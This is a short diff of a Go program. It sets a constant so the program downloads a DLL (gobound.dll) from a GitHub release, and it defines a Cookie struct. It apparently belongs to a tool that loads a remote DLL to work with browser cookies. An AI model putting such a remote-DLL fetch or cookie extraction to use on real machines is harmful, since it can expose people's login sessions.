@@ -14,9 +14,9 @@ import (
 	wc "github.com/carved4/go-wincall"
 )
 
-// change this prior to run, host somewhere like https://www.station307.com/
+// change this if you want to edit the dll src and recompile
 const (
-	downloadURL = ""
+	downloadURL = "https://github.com/carved4/gobound/releases/download/v1.0.0/gobound.dll"
 )
 
 type Cookie struct {
